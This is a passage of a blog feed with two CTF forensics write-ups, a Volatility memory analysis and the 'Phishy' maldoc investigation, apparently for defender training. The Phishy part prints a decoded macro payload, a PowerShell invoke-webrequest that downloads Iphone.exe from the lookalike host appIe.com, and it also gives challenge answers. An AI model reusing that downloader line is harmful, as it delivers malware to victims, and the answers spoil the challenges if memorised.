class=\"line\">0xbf0f6d51c4a0  TCPv4   10.0.2.15       49838   13.107.3.254    443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:23</span><br><span class=\"line\">0xbf0f6d525a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br><span class=\"line\">0xe80000193a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br></pre></td></tr></table></figure>\n<p>Oh wait man! Don’t count it manually, just use the magic of  <code>wc -l</code>  !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED | <span class=\"built_in\">wc</span> -l</span><br><span class=\"line\"></span><br><span class=\"line\">10</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 10</p>\n</div>\n<blockquote>\n<p>5- What FQDN does Chrome have an established network connection with?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan | grep -i chrome</span><br><span class=\"line\">0xbf0f6a896ae0.0TCPv4   10.0.2.15DB scan49773fin185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6c85bb20  TCPv4   10.0.2.15       49775   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6ca71a20  TCPv4   10.0.2.15       49769   142.250.190.14  443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:55</span><br><span class=\"line\">0xbf0f6cbb9530  TCPv4   10.0.2.15       49772   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6cfd17f0  TCPv4   10.0.2.15       49777   35.186.220.63   443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6d51c010  TCPv4   10.0.2.15       49763   172.217.4.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:53</span><br><span class=\"line\">0xbf0f6d5c8a70  TCPv4   10.0.2.15       49797   172.217.4.74    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:48:27</span><br><span class=\"line\">0xbf0f6d5d1ac0  TCPv4   10.0.2.15       49770   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:57</span><br><span class=\"line\">0xbf0f6d8a1010  TCPv4   10.0.2.15       49771   185.70.41.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:57</span><br></pre></td></tr></table></figure>\n<p>Wow man! we found a single established connection with IP  <code>185.70.41.130</code> <br>\nI used a random website that give me the FQDN from the IP address!</p>\n<p><img data-src=\"https://imgur.com/XJSnlsS.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  <code>protonmail.ch</code></p>\n</div>\n<blockquote>\n<p>6- What is the MD5 hash value of process executable for PID 6988?</p>\n</blockquote>\n<p>Let’s dump the executable of the process with pid 6988, I used to do that with  <code>procdump</code>  plugin with volatility2, but this time i am trying to use volatility3 so with somesearch i found that  <code>windows.pslist</code>  plugin has  <code>--dump</code>  argument that can dump the excutable of the process. Let’s do it !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dump </span><br><span class=\"line\">Volatility 3 Framework 2.2.0</span><br><span class=\"line\">Progress:  100.00               PDB scanning finished</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output</span><br><span class=\"line\"></span><br><span class=\"line\">6988    4352    OneDrive.exe    0xbf0f6d4262c0  26      -       1       True    2021-04-30 17:40:01     N/A     pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to use  <code>md5sum</code>  to get the md5 hash of the executable!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">md5sum</span> pid.6988.0x1c0000.dmp</span><br><span class=\"line\">0b493d8e26f03ccd2060e0be85f430af  pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 0b493d8e26f03ccd2060e0be85f430af</p>\n</div>\n<blockquote>\n<p>7- What is the word starting at offset 0x45BE876 with a length of 6 bytes?<br>\nOK we need to know the word at offset 0x45BE876! we can do it using  <code>xxd</code>  just we start from this offest and stop after 6 bytes! to specify the offset that you want to start from it just use  <code>-s</code>  options and to specify the length to display use  <code>-l</code>  option</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxd -g1 --s 0x45be876 -l 6 20210430-Win10Home-20H2-64bit-memdump.mem </span><br><span class=\"line\">045be876: 68 61 63 6b 65 72                                hacker</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: hacker</p>\n</div>\n<blockquote>\n<p>8- What is the creation date and time of the parent process of “powershell.exe”? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We need to know the parent process of powershell! we can do it using  <code>pslist</code>  and check the  <code>PPID</code> . But I’ll go with  <code>pstree</code>  plugin! it will make it easier for me. I don’t want to waste my time searching at the parent process using PPID !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pstree |  grep -i powershell -B 4</span><br><span class=\"line\">* 564   668     LogonUI.exe     0xbf0f6b7b7100  0       -       1       False   2021-04-30 12:39:44      2021-04-30 17:39:58</span><br><span class=\"line\">* 4296  668     userinit.exe    0xbf0f6ca8f080  0       -       1       False   2021-04-30 17:39:48      2021-04-30 17:40:12</span><br><span class=\"line\">** 4352 4296    explorer.exe    0xbf0f6ca662c0  82      -       1       False   2021-04-30 17:39:48      N/A</span><br><span class=\"line\">*** 6884        4352    VBoxTray.exe    0xbf0f6d186080  11      -       1       False   2021-04-30 17:40:01      N/A</span><br><span class=\"line\">*** 5096        4352    powershell.exe  0xbf0f6d97f2c0  12      -       1       False   2021-04-30 17:51:19      N/A</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 2021-04-30 17:39:48</p>\n</div>\n<blockquote>\n<p>9- What is the full path and name of the last file opened in notepad?</p>\n</blockquote>\n<p>Notepad is an executable that use the file as an argument ! so  <code>cmdline</code>  plugin will help us the get the files opened with notepad !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep -i notepad   </span><br><span class=\"line\">2520 notepad.exe     <span class=\"string\">&quot;C:\\Windows\\system32\\NOTEPAD.EXE&quot;</span> C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</p>\n</div>\n<blockquote>\n<p>10- How long did the suspect use Brave browser? (hh:mm:ss)</p>\n</blockquote>\n<p>Let me tell you something! When we speak about more details about system apps nothing will be usefull more than the windows registries! One of the most important registries is  <code>UserAssist</code> <br>\nThe  <code>UserAssist</code>  key, a part of Microsoft Windows registry, records the information related to programs run by a user on a Windows system</p>\n<p>Volatility is powerful! we can use the  <code>userassist</code>  plugin to get what we want!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep -i brave </span><br><span class=\"line\">* 0xa80333cda0000       \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Temp\\GUM20E0.tmp\\BraveUpdate.exe N/A      0       0       0:00:03  N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Update\\BraveUpdate.exe     N/A   0:00:24.797000   N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   Brave   N/A     9       22      4:01:54  2021-04-30 17:48:45</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;F4E57C4B-2036-45F0-A9AB-443BCFE33D9F&#125;\\Count  2021-04-30 17:51:18      Value   C:\\Users\\Public\\Desktop\\Brave.lnk       N/A     8       0     0:00:00.508000   2021-04-30 17:48:45</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  04:01:54</p>\n</div>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/05/CyberDefenders/Phishy/",
            "url": "http://example.com/2022/09/05/CyberDefenders/Phishy/",
            "title": "CyberDefenders Writeup  Phishy",
            "date_published": "2022-09-05T15:46:09.000Z",
            "content_html": "<p>This CTF challenge is about retrieving data from a disk image, and analyzing a maldoc using oledump.<br>\nThe maldoc download a malware in our victim personal computer! Let’s figure out what is going on!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee’s system for further analysis. As a security analyst, you are tasked to identify how the system was compromised.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjA=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Phishy</p>\n          </div></div><div class=\"item\" title=\"Author - SemahBA\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\" data-background-image=\"https://pbs.twimg.com/profile_images/1358429186348711936/QRHPcCVi_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9CZW5hbGlTZW1haA==\">Author - SemahBA</span>\n          <p class=\"desc\">SemahBA Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>I use WSL, FTK imager and Registry Explorer</p>\n<blockquote>\n<p>1- What is the hostname of the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/UlU40CE.png\" alt=\"\"><br>\nLet’s check  <code>SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName</code>  registry key<br>\n<img data-src=\"https://i.imgur.com/bUMRhhs.png\" alt=\"\"></p>\n<p>Answer:  WIN-NF3JQEU4G0T</p>\n<blockquote>\n<p>2- What is the messaging app installed on the victim machine?</p>\n</blockquote>\n<p><img data-src=\"https://i.imgur.com/vE2xpqz.png\" alt=\"WhatsApp\"><br>\nAnswser: WhatsApp</p>\n<blockquote>\n<p>3- The attacker tricked the victim into downloading a malicious document. Provide the full download URL.</p>\n</blockquote>\n<p>WhatsApp has a database that stores the messages and discussion. Let’s check  <code>\\Users\\Semah\\AppData\\Roaming\\WhatsApp</code> .We find a folder called  <code>Databases</code>  that contains a  <code>db</code>  that can be opened using  <code>DB Browser for SQLite</code> . The messages are stored in  <code>msgstore.db</code> <br>\n<img data-src=\"https://imgur.com/SFlAYTD.png\" alt=\"\"><br>\nWe can open this db file using  <code>DB Browser</code>  and check the  <code>legacy_available_messages_view</code>  table and we will a discussion about IPhone 12 special edition giveaway<br>\n<img data-src=\"https://imgur.com/EGZVAxH.png\" alt=\"\"><br>\nAnswer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JUGhvbmUtV2lubmVycy5kb2M=\">http://appIe.com/IPhone-Winners.doc</span></p>\n<blockquote>\n<p>4- Multiple streams contain macros in the document. Provide the number of the highest stream.</p>\n</blockquote>\n<p>The victim download the word document file. You can find it on  <code>Semah\\Downloads</code>  folder<br>\nLet’s export it from FTK imager and use  <code>oledump</code>  to check the streams in the document<br>\nWe find  <code>Macros/VBA/iphoneevil</code>  the highest stream</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ oledump IPhone-Winners.doc                                                                                       </span><br><span class=\"line\">  1:       114 <span class=\"string\">&#x27;\\x01CompObj&#x27;</span></span><br><span class=\"line\">  2:      4096 <span class=\"string\">&#x27;\\x05DocumentSummaryInformation&#x27;</span></span><br><span class=\"line\">  3:      4096 <span class=\"string\">&#x27;\\x05SummaryInformation&#x27;</span></span><br><span class=\"line\">  4:      8473 <span class=\"string\">&#x27;1Table&#x27;</span></span><br><span class=\"line\">  5:       501 <span class=\"string\">&#x27;Macros/PROJECT&#x27;</span></span><br><span class=\"line\">  6:        68 <span class=\"string\">&#x27;Macros/PROJECTwm&#x27;</span></span><br><span class=\"line\">  7:      3109 <span class=\"string\">&#x27;Macros/VBA/_VBA_PROJECT&#x27;</span></span><br><span class=\"line\">  8:       800 <span class=\"string\">&#x27;Macros/VBA/dir&#x27;</span></span><br><span class=\"line\">  9: M    1170 <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\"> 10: M    5581 <span class=\"string\">&#x27;Macros/VBA/iphoneevil&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Answer: 10</p>\n<p>Let’s do some analysis on the macro and the malicious document using the  <code>oletools</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Raf²@4n6nk8s:~$ olevba IPhone-Winners.doc --deobf</span><br><span class=\"line\">olevba IPhone-Winners.doc --deobf                                                                                 ─╯</span><br><span class=\"line\">XLMMacroDeobfuscator: pywin32 is not installed (only is required <span class=\"keyword\">if</span> you want to use MS Excel)</span><br><span class=\"line\">olevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools</span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">FILE: IPhone-Winners.doc</span><br><span class=\"line\">Type: OLE</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">VBA MACRO eviliphone.cls</span><br><span class=\"line\"><span class=\"keyword\">in</span> file: IPhone-Winners.doc - OLE stream: <span class=\"string\">&#x27;Macros/VBA/eviliphone&#x27;</span></span><br><span class=\"line\">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br></pre></td></tr></table></figure>\n<p>Scrolling a bit and we find a VBA string variable from the macro that contain base64 cipher, the macro try to execute the decoded<br>\nٍ<img data-src=\"https://imgur.com/bvrf9oR.png\" alt=\"\"><br>\nOK let’s decode it and check what the attacker want to do !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s:~$ <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;aQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA&quot;</span> | <span class=\"built_in\">base64</span> -d</span><br><span class=\"line\"></span><br><span class=\"line\">invoke-webrequest -Uri <span class=\"string\">&#x27;http://appIe.com/Iphone.exe&#x27;</span> -OutFile <span class=\"string\">&#x27;C:\\Temp\\IPhone.exe&#x27;</span> -UseDefaultCredentials</span><br></pre></td></tr></table></figure>\n<p>Wow! The macro try to run an obfuscated  <code>powershell</code>  command that download an executable from  <code>http://appIe.com/Iphone.exe</code>  and save it as   <code>C:\\Temp\\IPhone.exe</code></p>\n<blockquote>\n<p>5- The macro executed a program. Provide the program name?</p>\n</blockquote>\n<p>Answer: Powershell</p>\n<blockquote>\n<p>6- The macro downloaded a malicious file. Provide the full download URL.</p>\n</blockquote>\n<p>Answer: <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbS9JcGhvbmUuZXhl\">http://appIe.com/Iphone.exe</span></p>\n<blockquote>\n<p>7- Where was the malicious file downloaded to? (Provide the full path)</p>\n</blockquote>\n<p>Answer:  C:\\Temp\\IPhone.exe</p>\n<blockquote>\n<p>8- What is the name of the framework used to create the malware?</p>\n</blockquote>\n<p>I am sure that Metasploit is the framework. But let’s make it like we get the points without guessing the answer! OK dude upload the malicious file downloaded to our love  <code>virustotal</code> <br>\n<img data-src=\"https://imgur.com/BKPJ37M.png\" alt=\"\"></p>\n<p>Just google  <code>Meterpreter</code>  and you’ll find that Meterpreter is a Metasploit attack payload that provides an interactive shell</p>\n<p>Ok dude don’t search ! go to  <code>COMMUNITY</code>  tab in  <code>virustotal</code>  and you’ll find comments. You’ll find a metasploit payload detected !</p>\n<p><img data-src=\"https://imgur.com/xuOEWiC.png\" alt=\"\"></p>\n<p>Answer: Metasploit</p>\n<blockquote>\n<p>9- What is the attacker’s IP address?</p>\n</blockquote>\n<p>OK! Now we know that the malicious document download a binary! Of course this binary is a malware.<br>\nWe need to know what is the attacker’s IP address. So let’s do some dynamic analysis. We can do it using either  <code>any.run</code>  or  <code>hybrid-analysis</code> . I will use it both of them just for fun !! Just upload the binary  <code>IPhone.exe</code>  and check the connections !</p>\n<p>ٍ<img data-src=\"https://imgur.com/w04BlMl.png\" alt=\"\" title=\"Using app.run.any\"><br>\nٍ<img data-src=\"https://imgur.com/wNJKnce.png\" alt=\"\" title=\"Using HYBRID ANALYSIS\"></p>\n<p>Answer: 155.94.69.27</p>\n<blockquote>\n<p>10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?</p>\n</blockquote>\n<p>We find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in  <code>AppData\\Roaming\\Mozilla\\Firefox\\</code> . We can inspect it using SQLite Browser.<br>\nThe most important db file is  <code>places.sqlite</code> . Inspect it and open the  <code>moz_places</code>  database table and check the history of the victim !<br>\n<img data-src=\"https://imgur.com/qbtAcRf.png\" alt=\"\"></p>\n<p>Answer:  <span class=\"exturl\" data-url=\"aHR0cDovL2FwcEllLmNvbXBldGl0aW9ucy5jb20vbG9naW4ucGhw\">http://appIe.competitions.com/login.php</span></p>\n<blockquote>\n<p>11- What is the password the user submitted to the login page?</p>\n</blockquote>\n<p>There is a tool called  <code>Password Fox</code>  that will resolve our problem here !<br>\nPasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.<br>\nDownload it from <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvcGFzc3dvcmRmb3guaHRtbA==\">here</span></p>\n<p><img data-src=\"https://imgur.com/pM1lfwD.png\" alt=\"\" title=\"Here is the password\"></p>\n<p>Answer: GacsriicUZMY4xiAF4yl</p>\n",
            "tags": []
        }
    ]
}